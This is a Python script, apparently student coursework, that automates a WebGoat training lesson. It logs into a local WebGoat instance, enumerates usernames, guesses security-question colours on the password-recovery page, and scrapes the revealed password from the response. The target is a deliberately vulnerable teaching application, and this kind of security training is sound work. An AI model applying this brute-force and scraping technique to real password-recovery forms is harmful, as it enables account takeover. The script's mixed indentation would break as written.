#This code was constructed by Nicholas Kantor and Tanner Harper at The University of Texas at Austin

import requests
import json

url = "http://127.0.0.1:8080/WebGoat" #url to webgoat application to test
valSpace = 18  #distance between index value and actual actual beginning of password
url1 = url + "/start.mvc" 
lessonURL = url + "/service/lessonmenu.mvc" #url to request to get the json which contains the list of Lessons

headers = headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36'
}
payload = dict(username='guest', password='guest') #login information 
s = requests.Session()
s.get(url)  #initiate contact with webpage
s.post(url + "/j_spring_security_check;jsessionid=" + s.cookies.get('JSESSIONID'),data=payload, headers = headers) #authenticate with webpage
r = s.get(url1)  	#load homepage after logging in

r1 = s.get(lessonURL) #contains screen number and menu number for attack URL, saved in r1

parsed_json = json.loads(r1.content) #parse the json content in order to make it easier to work with

attackURL = url  + "/"  + parsed_json[4]['children'][1]['link']   #constructs the url of the attack lesson by searching the parsed json and concatenating it with base url


usernames = ("archer", "roger", "obama", "mozambique", "superman", "tanner", "bob", "ted", "dylan", "rob", "nick", "jeff", "admin") #list is short for simple demonstration, actual list could contain n number of names
colors = ("orange", "yellow", "red", "blue", "black", "purple", "green", "white", "brown", "tan", "silver", "gold", "purple", "yellow") #list is shortened for simple demonstration using the most obvious colors, actual list could contain n number of colors
got_it = False
for u in usernames:
	fun = {"Username": u}
       	r2 = s.post(attackURL,data=fun)
	# make the request here for the username
        if "name='Color'"  in r2.text: # if & only if request is good, then "name='Color'" will appear in r2.text
        	for c in colors:        
	        	happy = {"Color": c}
		        r2 = s.post(attackURL,data=happy)  #send the information for the user name and save response in r2
			# make the request here for the color
                        if "For security reasons" in r2.text: 	#if & only if request is good, then "For security reasons" will appear in r2.text
                                got_it = True 			#if color is valid, then we found the password page!
				value = int(r2.text.index("<tr><td>Password: "))  	#get beginning index for user's password
				value = value + valSpace   				#change value to begin after the "<tr><td>Password: "
				endVal = int(r2.text.index("</td></tr></table>"))	#find the index of where the password ends
				print "username=" + u, ", color=" + c, ", password=" + r2.text[value:endVal]  
if not got_it:
        print "none found"
